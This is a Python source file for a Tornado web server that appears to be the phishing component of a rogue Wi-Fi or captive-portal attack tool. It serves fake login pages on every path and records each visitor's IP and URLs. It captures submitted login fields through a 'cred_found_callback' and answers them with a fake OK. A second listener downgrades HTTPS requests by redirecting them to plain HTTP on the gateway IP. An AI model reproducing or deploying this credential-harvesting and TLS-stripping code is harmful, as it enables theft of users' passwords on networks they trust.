import datetime
import logging
import json
import re
import time
import tornado.ioloop
import tornado.web
import os.path
import common.constants as constants

logging.getLogger('tornado.access').disabled = True
logging.getLogger('tornado.general').disabled = True

class DowngradeToHTTP(tornado.web.RequestHandler):
    def get(self):
        http_url = 'http://' + constants.NETWORK_GW_IP + ':' + str(constants.PORT) + '/'
        self.redirect(http_url)

class HTTPHandler(tornado.web.RequestHandler):
    def initialize(self, html_path, login_url, login_params, url_callback, creds_callback):
        self.html_path = html_path
        self.login_url = login_url
        self.login_params = login_params
        self.url_callback = url_callback
        self.creds_callback = creds_callback

    def get(self):
        # choose the correct file to serve
        if os.path.isfile(self.html_path + self.request.path):
            render_file = self.request.path
        else:
            render_file = "index.html"

        # load the file
        file_path = self.html_path + render_file
        self.render(file_path)
        
        # record the GET request in the logging file
        logging.debug("[+] GET request from %s for %s" % (self.request.remote_ip, 
                                                          self.request.full_url()))

        # Send the client's IP and visited URL to the specified callback
        self.url_callback(self.request.remote_ip, self.request.full_url())

    def post(self):
        # check the http POST request header contains the Content-Type
        try:
            content_type = self.request.headers["Content-Type"]
        except KeyError:
            return

        # record the POST request in the logging file
        logging.debug("[D] POST request from %s for %s" % (self.request.remote_ip,
                                                           self.request.full_url()))
        try:
            # Check if this is a valid POST request
            if content_type.startswith(constants.VALID_POST_CONTENT_TYPE):
                post_data = tornado.escape.json_decode(self.request.body)

                # record the post requests in the logging file
                if len(post_data) > 0:
                    logging.debug("[D] POST request from %s with body: %s" % (self.request.remote_ip,
                                                                              post_data))
                valid = True
                try:
                    # Check if the URL is the login one
                    if self.request.path[1:] != self.login_url:
                        valid = False

                    # Check if the parameters are in the json body
                    for param in self.login_params:
                        if param not in post_data:
                            valid = False
                            break

                    # Check that the parameters are NOT empty
                    for param in post_data:
                        if post_data[param] == '':
                            valid = False
                            break
                except:
                    valid = False

                if valid:
                    self.creds_callback(self.request.remote_ip, post_data)
                    self.set_header('Content-Type', 'application/json')
                    self.write('{"status": "OK"}')
                    return

        # Invalid UTF-8, drop it.
        except UnicodeDecodeError:
            pass
        except:
            return

        # If no credentials were submitted, 
        # then return HTTP/1.1 401 Unauthorized
        raise tornado.web.HTTPError(status_code=401)


class LoginForm():
    def __init__(self):
        self.ip = None
        self.http_port = None
        self.https_port = None
        self.html_path = None
        self.static_path = None
        self.cert_path = None
        self.login_url = None
        self.login_params = None
        self.check_url_callback = None
        self.cred_found_callback = None

    def runWebApp(self):
        http_handler_args = {
            'html_path': self.html_path,
            'login_url': self.login_url,
            'login_params': self.login_params,
            'url_callback': self.check_url_callback,
            'creds_callback': self.cred_found_callback
        }
        webapp = tornado.web.Application(
            [
                (r"/.*", HTTPHandler, http_handler_args),
            ],
            template_path = self.html_path,
            static_path = self.static_path,
            compiled_template_cache = False
        )
        webapp.listen(self.http_port, address = self.ip)
    
        ssl_webapp = tornado.web.Application(
            [
                (r"/.*", DowngradeToHTTP)
            ]
        )
        https_server = tornado.httpserver.HTTPServer(ssl_webapp,
                                                     ssl_options = {
                                                         "certfile": self.cert_path,
                                                         "keyfile": self.cert_path,
                                                     })
        https_server.listen(self.https_port, address = self.ip)
        tornado.ioloop.IOLoop.instance().start()
